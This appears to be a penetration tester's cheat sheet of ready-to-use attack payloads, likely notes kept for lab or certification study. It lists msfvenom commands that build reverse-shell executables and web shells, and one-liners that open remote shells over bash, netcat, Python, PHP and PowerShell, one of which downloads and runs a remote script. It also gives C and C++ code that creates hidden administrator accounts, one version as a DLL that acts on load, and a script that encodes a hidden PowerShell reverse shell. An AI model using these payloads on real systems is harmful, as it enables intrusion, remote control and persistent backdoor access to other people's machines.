

| [[13 Common Payloads#MSFVenom\|MSFVenom]] | [[13 Common Payloads#One-Liners\|One Liners]] | [[13 Common Payloads#Custom\|Custom]] |
| -------------------------------------- | ------------------------------------------ | ---------------------------------- |
## MSFVenom
```shell
# Executable Files
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST= <IP> LPORT=<PORT> -f elf > reverse

# Web-Based Files
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

# Scripting Payloads
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl

```
## One-Liners
```shell
# Remember to change KALI_IP and PORT
# Bash
bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1

# Bash Pipe
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

# Python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# PHP
<?php echo shell_exec('bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1');?>

# PowerShell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>:8000/powercat.ps1'); powercat -c <KALI_IP> -p <PORT> -e powershell"
# or just use encode.py from lab

# Busybox Netcat
busybox nc <KALI_IP> <PORT> -e sh

# Python3 Shell Upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## Custom
- adduser.c
```c
// x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
#include <stdlib.h>

int main (){
  system("net user hacker Password123! /add");
  system("net localgroup administrators hacker /add");

  return 0;
}
```
- adduser.dll
```cpp
// x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user backdoor Password123! /add");
  	    i = system ("net localgroup administrators backdoor /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
- encode.py
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<KALI_IP",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```